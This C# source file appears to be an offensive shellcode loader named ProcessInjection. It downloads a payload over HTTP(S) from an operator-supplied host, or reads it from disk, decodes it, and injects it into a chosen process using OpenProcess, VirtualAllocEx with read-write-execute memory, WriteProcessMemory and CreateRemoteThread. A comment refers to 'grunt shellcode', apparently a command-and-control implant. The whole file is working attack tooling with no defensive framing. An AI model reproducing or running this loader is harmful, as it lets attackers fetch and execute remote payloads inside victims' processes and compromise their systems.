using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace ProcessInjection
{
  class Program
  {

    static WebClient GetWebClient()
    {
      WebClient wc = new WebClient();
      wc.UseDefaultCredentials = true;
      wc.Proxy = WebRequest.DefaultWebProxy;
      wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
      return wc;
    }
    static void Main(string[] args)
    {
      int targetPid;
      string binLocation;
      string binType;
      byte[] shellcode;
      bool isSelf = false;
      if (args.Length < 2) {
        Console.Error.WriteLine("[x] Invalid number of arguments");
        Console.Error.WriteLine("    Usage: ProcessInjection.exe <pid|self> <binlocation> <bintype>");
        Console.Error.WriteLine("    Example: ProcessInjection.exe self http://x.x.x.x/app.b64 b64");
        Console.Error.WriteLine("    Example: ProcessInjection.exe 1000 C:\\Temp\\app.bin bin");
        return;
      } else {
        if (args[0] == "self") {
          isSelf = true;
          targetPid = Process.GetCurrentProcess().Id;
        } else {
          targetPid = int.Parse(args[0]);
        }
        binLocation = args[1];
        binType = args[2];
      }
      string strData;
      byte[] binData;

      if (binType == "base64" || binType == "b64") {
        if (binLocation.StartsWith("http://") || binLocation.StartsWith("https://")) {
          Console.WriteLine("[>] Pulling over http(s) {0}", binLocation);
          WebClient wc = GetWebClient();
          try {
            strData = wc.DownloadString(binLocation);
          } catch (WebException ex) {
            string status = ex.Status.ToString();
            Console.Error.WriteLine("[x] Error downloading data: {0}", status);
            return;
          }
          try {
            shellcode = Convert.FromBase64String(strData);
          } catch (FormatException ex) {
            Console.Error.WriteLine("[x] Error decoding data: formatting error - {0}", ex.Message);
            return;
          }
        } else {
          Console.WriteLine("[>] Pulling Bin Locally {0}", binLocation);
          try {
            strData = File.ReadAllText(binLocation);
          } catch (Exception ex) {
            Console.Error.WriteLine("[x] Error reading data: {0}", ex.Message);
            return;
          }
          try {
            shellcode = Convert.FromBase64String(strData);
          } catch (FormatException ex) {
            Console.Error.WriteLine("[x] Error decoding data: formatting error - {0}", ex.Message);
            return;
          }

        }
      } else if (binType == "bin" || binType == "dll" || binType == "exe") {
        if (binLocation.StartsWith("http://") || binLocation.StartsWith("https://")) {
          Console.WriteLine("[>] Pulling over http(s) {0}", binLocation);
          WebClient wc = GetWebClient();
          try {
            binData = wc.DownloadData(binLocation);
          } catch (WebException ex) {
            string status = ex.Status.ToString();
            Console.Error.WriteLine("[x] Error downloading data: {0}", status);
            return;
          }

          shellcode = binData;
        } else {
          Console.WriteLine("[>] Pulling Bin Locally {0}", binLocation);
          try {
            binData = File.ReadAllBytes(binLocation);
          } catch (Exception ex) {
            Console.Error.WriteLine("[x] Error reading data: {0}", ex.Message);
            return;
          }
          shellcode = binData;
        }
      } else {
        Console.Error.WriteLine("[x] Invalid bin type. Use base64 or bin");
        Console.Error.WriteLine("    Usage: ProcessInjection.exe <pid> <binlocation> <bintype>");
        return;
      }

      try {
        // Find the target process
        Process targetProcess = Process.GetProcessById(targetPid);

        // Get a handle to the target process
        var hProcess = Win32.OpenProcess(
            Win32.ProcessAccessFlags.All,
            false,
            targetProcess.Id
        );

        if (hProcess != IntPtr.Zero)
          Console.WriteLine("[>] Got handle to {0}", targetProcess.ProcessName);

        // Allocate region of memory in the target process
        var memoryAddress = Win32.VirtualAllocEx(
            hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
            Win32.MemoryProtection.ExecuteReadWrite
        );

        if (memoryAddress != IntPtr.Zero)
          Console.WriteLine("[>] Allocated memory region");

        // Copy grunt shellcode to target process
        UIntPtr bytesWritten;
        var shellcodeWritten = Win32.WriteProcessMemory(
            hProcess,
            memoryAddress,
            shellcode,
            (uint)shellcode.Length,
            out bytesWritten
        );

        if (shellcodeWritten)
          Console.WriteLine("[>] Shellcode written");

        // Create a thread in the target process to execute the shellcode
        IntPtr threadId;
        var hThread = Win32.CreateRemoteThread(
            hProcess,
            IntPtr.Zero,
            0,
            memoryAddress,
            IntPtr.Zero,
            0,
            out threadId
        );

        if (hThread != IntPtr.Zero)
          Console.WriteLine("[>] Remote Thread started");
        if (isSelf) {
          Console.WriteLine("[>] Waiting Forever");
          while (true) {
            Thread.Sleep(1000);
          }
        }
        Console.WriteLine("[>] Done!");
      } catch (Exception e) {
        Console.Error.WriteLine("[x] Error:");
        Console.Error.WriteLine("    {0}", e.Message);
        Console.Error.WriteLine("    {0}", e.StackTrace);
      }
    }
  }

  class Win32
  {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        ProcessAccessFlags processAccess,
        bool bInheritHandle,
        int processId
    );

    [Flags]
    public enum ProcessAccessFlags : uint
    {
      All = 0x001F0FFF,
      Terminate = 0x00000001,
      CreateThread = 0x00000002,
      VirtualMemoryOperation = 0x00000008,
      VirtualMemoryRead = 0x00000010,
      VirtualMemoryWrite = 0x00000020,
      DuplicateHandle = 0x00000040,
      CreateProcess = 0x000000080,
      SetQuota = 0x00000100,
      SetInformation = 0x00000200,
      QueryInformation = 0x00000400,
      QueryLimitedInformation = 0x00001000,
      Synchronize = 0x00100000
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        AllocationType flAllocationType,
        MemoryProtection flProtect
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );

    [Flags]
    public enum AllocationType
    {
      Commit = 0x1000,
      Reserve = 0x2000,
      Decommit = 0x4000,
      Release = 0x8000,
      Reset = 0x80000,
      Physical = 0x400000,
      TopDown = 0x100000,
      WriteWatch = 0x200000,
      LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
      Execute = 0x10,
      ExecuteRead = 0x20,
      ExecuteReadWrite = 0x40,
      ExecuteWriteCopy = 0x80,
      NoAccess = 0x01,
      ReadOnly = 0x02,
      ReadWrite = 0x04,
      WriteCopy = 0x08,
      GuardModifierflag = 0x100,
      NoCacheModifierflag = 0x200,
      WriteCombineModifierflag = 0x400
    }
  }
}